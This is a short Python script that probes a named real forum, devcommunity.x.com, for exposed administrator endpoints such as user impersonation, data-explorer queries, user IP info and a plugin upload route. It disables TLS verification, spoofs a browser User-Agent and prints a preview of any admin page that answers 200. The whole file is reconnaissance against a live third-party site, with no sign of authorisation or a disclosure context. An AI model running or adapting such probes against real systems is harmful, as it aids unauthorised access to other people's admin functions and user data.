import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET = "https://devcommunity.x.com"
ROUTES = [
    "/admin/impersonate",
    "/admin/plugins/explorer/queries/",
    "/admin/users/ip-info",
    "/admin/plugins/discourse-ai/rag-document-fragments/files/upload",
    "/admin/config/upcoming-changes",
    "/admin/users/list/active",
    "/admin/reports/bulk",
    "/admin/plugins/"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

def probe():
    print(f"[*] Probing {TARGET} for Admin Access...\n")
    
    for route in ROUTES:
        url = TARGET + route
        try:
            resp = requests.get(url, headers=HEADERS, verify=False, allow_redirects=False, timeout=10)
            status = resp.status_code
            length = len(resp.text)
            
            # If 200, it's huge. 403 is expected. 302 usually means redirect to login.
            print(f"[{status}] {route} (Len: {length})")
            
            if status == 200:
                print(f"  [!] CRITICAL: {url} returned 200 OK!")
                print(f"  Preview: {resp.text[:200]}")
            elif status == 302:
                print(f"  -> Redirect to: {resp.headers.get('Location')}")
                
        except Exception as e:
            print(f"[ERR] {route}: {e}")

if __name__ == "__main__":
    probe()
